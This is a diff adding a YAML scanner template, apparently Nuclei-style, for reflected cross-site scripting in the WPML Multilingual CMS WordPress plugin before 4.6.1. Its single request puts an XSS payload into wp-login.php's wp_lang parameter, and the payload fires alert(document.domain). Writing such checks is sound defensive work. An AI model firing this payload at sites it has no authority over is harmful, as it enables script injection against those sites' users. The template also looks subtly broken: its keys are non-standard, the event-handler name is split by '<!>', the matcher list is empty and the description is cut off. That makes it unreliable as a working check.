@@ -1,0 +1,19 @@
+id: wpml-multilingual-cms-xss
+brief:
+    title: WordPress WPML Multilingual CMS < 4.6.1 - Cross-Site Scripting
+    by: ritikchaddha
+    level: high
+    about: The WPML Multilingual CMS plugin for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS) in versions prior to 4.6.1. The plugin does not escape some URL attributes before outputting the...
+    label:
+        - wordpress
+        - wp
+        - wp-plugin
+        - wpml
+        - xss
+        - sitepress-multilingual-cms
+    score: CVSS:7.1
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c'
+      signs: []
